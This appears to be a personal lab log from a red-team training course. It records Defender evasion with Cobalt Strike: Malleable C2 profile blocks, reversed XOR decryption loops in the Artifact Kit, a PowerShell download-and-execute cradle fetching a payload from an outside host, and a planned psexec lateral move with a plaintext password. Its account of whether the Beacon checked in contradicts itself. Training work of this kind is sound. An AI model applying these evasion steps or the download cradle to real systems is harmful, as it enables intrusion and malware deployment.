---
date: 2026-09-10
lab-env: CRTO-Lab
domains: [defense-evasion-opsec]
tags: [lab-log, malleable-c2, artifact-kit, defender-bypass, lateral-movement]
---

# Lab Session — 2026-09-10

## Objective

Bypass Windows Defender by modifying Cobalt Strike's default Malleable C2 profile, Artifact Kit payloads, and post-ex behaviours. Then move laterally to `lon-ws-1` via `psexec64`.

## Environment

- Starting point: Attacker Desktop (Kali/CS Team Server)
- Target: Workstation (victim), lon-ws-1
- Lateral movement user: `CONTOSO\rsteel` (local admin on lon-ws-1)

---

## Steps Taken

### 1. Modified Malleable C2 Profile

Edited `/opt/cobaltstrike/profiles/default.profile` to add three new blocks:

- **`stage` block** — disables RWX memory, enables cleanup, copies PE header off, sets module stomping target to `Hydrogen.dll`, and applies string replacements to Beacon's PE header strings and a hardcoded shellcode byte sequence.
- **`post-ex` block** — sets `spawnto` to `werfault.exe`, custom pipe name mimicking dotnet diagnostics, thread start address hint, AMSI disable, and string replacements in PowerPick/ExecuteAssembly DLLs.
- **`process-inject` block** — `VirtualAllocEx` allocator, BOF reuse, no RWX at rest or execution, thread creation chain: `CreateThread` (spoofed) → `NtQueueApcThread-s` → `NtQueueApcThread` → `SetThreadContext`.

Restarted team server and verified clean profile load:

```bash
sudo /usr/bin/docker restart cobalt
sudo /usr/bin/docker logs cobalt
```

Confirmed in CS client: Cobalt Strike > Malleable C2 Profile.

**Result:** Profile loaded without errors.

**Linked technique:** [[Beacon-Command-Behavior]]

---

### 2. Modified Artifact Kit (patch.c XOR loops)

Opened `C:\Tools\cobaltstrike\arsenal-kit\kits\artifact\src-common\patch.c` in VS Code.

Changed the two XOR decryption loops from a forward iteration to a **reverse/backward iteration** pattern:

**Loop 1 (~line 45, svc exe payloads):**
```c
x = length;
while ( x-- ) {
    *((char *)buffer + x) = *((char *)buffer + x) ^ key[x % 8];
}
```

**Loop 2 (~line 116, normal exe payloads):**
```c
int x = length;
while ( x-- ) {
    *((char *)ptr + x) = *((char *)buffer + x) ^ key[x % 8];
}
```

Built the artifacts targeting `mailslot` transport with `VirtualAlloc`, size `382437`:

```bash
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
./build.sh mailslot VirtualAlloc 382437 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
```

Loaded `artifact.cna` from `C:\Tools\cobaltstrike\custom-artifacts\mailslot` via CS Script Manager.

**Result:** Built successfully. Script loaded.

**Linked technique:** [[Artifact-Kit]]

---

### 3. Hosted PowerShell Payload and Attempted Execution

Hosted a 64-bit PowerShell payload via Attacks > Scripted Web Delivery (http listener).

On victim Workstation:

```powershell
iex (new-object net.webclient).downloadstring("http://www.bleepincomputer.com/a")
```

**Result: FAILED** — Beacon did not check in. Defender likely caught the payload at execution time.

---

### 4. (Planned — not reached) Lateral Movement to lon-ws-1

Had the Beacon checked in, the plan was:

```beacon
make_token CONTOSO\rsteel Passw0rd!
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
jump psexec64 lon-ws-1 smb
```

**Result:** Not attempted — blocked at step 3.

---

## What Worked

- Malleable C2 profile loaded cleanly with all three new blocks
- Artifact Kit built successfully with modified XOR loops
- `artifact.cna` loaded into CS without errors

## What Didn't Work / Mistakes

- PowerShell payload was blocked on the victim machine — Beacon did not check in
- **Root cause (resolved):** pasted the `compress` contents incorrectly when modifying the Artifact Kit; re-doing it correctly fixed the issue and the Beacon checked in

## Key Takeaways

- Malleable C2 profile changes alone are not sufficient — Defender caught the artifact itself
- The Artifact Kit XOR loop inversion is the critical bypass for the executable payload signature; if that logic is wrong the payload will be corrupted or still signatured
- Profile OPSEC (`stage`, `post-ex`, `process-inject`) targets in-memory detection; the Artifact Kit targets on-disk/load-time detection — both layers must work together

## Lab Summary

This lab was the first full Defender bypass exercise in the CRTO course. The goal was to stack three layers of evasion:

1. **Malleable C2 profile** (`stage` + `post-ex` + `process-inject` blocks) — covers in-memory Beacon shape, sacrificial process selection, pipe name, thread hints, and AMSI. Applied to the Linux team server (`/opt/cobaltstrike/profiles/default.profile`), then server restarted via Docker.

2. **Artifact Kit** (`patch.c` XOR loop inversion) — changes the decryption routine in the generated EXE/DLL stagers so their byte pattern no longer matches Defender's signatures. Built on Windows via WSL (`build.sh mailslot VirtualAlloc 382437 ...`), output loaded into CS as an Aggressor script (`artifact.cna`).

3. **Lateral movement via psexec64** — once a Beacon was running on the victim Workstation, impersonate `rsteel`, override the service payload's spawnto with `ak-settings`, and jump to `lon-ws-1` over SMB.

The key lesson: each layer targets a different detection point. The profile handles what Beacon looks like at runtime. The Artifact Kit handles what the payload looks like on disk and at load time. Neither alone is sufficient against a modern AV; both must be correctly applied.

---

## Follow-up

- [ ] Add flashcard for: `ak-settings spawnto_x64` — required for service payloads because `%windir%` env vars don't resolve in SYSTEM context
- [ ] Add flashcard for: Artifact Kit `build.sh` argument order
- [ ] Add flashcard for: when pasting multi-block content into kit files, verify each section individually before building — a silent paste error produces a working build but a corrupt/signatured payload
